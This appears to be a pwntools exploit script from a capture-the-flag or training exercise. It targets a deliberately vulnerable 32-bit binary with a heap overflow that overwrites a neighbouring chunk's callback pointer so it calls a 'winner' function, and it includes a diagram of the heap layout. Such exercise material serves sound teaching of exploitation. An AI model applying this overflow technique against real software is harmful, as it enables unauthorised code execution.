#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.HOST and args.PORT:
        return remote(args.HOST, args.PORT, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x8048000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

BSS_CAVE  = 0x0804c038
WINNER = 0x80492b6

TEST_BSS_CAVE = 0x0804a110
TEST_WINNER = 0x08048646

log.info("""heap looks like this:

[i1 chunk]  (total: 24 bytes = 8 metadata + 16 user)
+------------------------+
| prev_size (4 bytes)    |
+------------------------+
| size (4 bytes)         |
+------------------------+
| priority (4 bytes)     |
+------------------------+
| name ptr (4 bytes) ----+----+
+------------------------+    |
| callback ptr (4 bytes) |    |
+------------------------+    |
| padding (4 bytes)      |    |
+------------------------+    |
                              |
[i1->name chunk]              |
(total: 16 bytes = 8 metadata + 8 user)
+------------------------+    |
| prev_size (4 bytes)    |    |
+------------------------+    |
| size (4 bytes)         |    |
+------------------------+    |
| name data (8 bytes) <--+----+
+------------------------+

[i2 chunk]  (total: 24 bytes)
+------------------------+
| prev_size (4 bytes)    |
+------------------------+
| size (4 bytes)         |
+------------------------+
| priority (4 bytes)     |
+------------------------+
| name ptr (4 bytes) ----+----+
+------------------------+    |
| callback ptr (4 bytes) |    |
+------------------------+    |
| padding (4 bytes)      |    |
+------------------------+    |
                              |
[i2->name chunk]              |
(total: 16 bytes)             |
+------------------------+    |
| prev_size (4 bytes)    |    |
+------------------------+    |
| size (4 bytes)         |    |
+------------------------+    |
| name data (8 bytes) <--+----+
+------------------------+

so we need to overcflow from i1->name into i2->callback. 8 bytes to fill the buffer, 8 bytes to kill i2 metadata,
4 bytes to overwrite priority, then a 4 byte writable address (just some BSS space) so reading into i2->name works,
then 4 more bytes for callback.

so 20 bytes, writable address, &winner().""")

name1 = b'A' * 20 + p32(BSS_CAVE) + p32(WINNER)

io = start(argv=[name1, "amino"])

# once we're in remote mode it wants this over stdin - kind of annoying
io.readuntil(b'Enter two names separated by space:\n')
io.sendline(name1 + b" amino")

io.interactive()

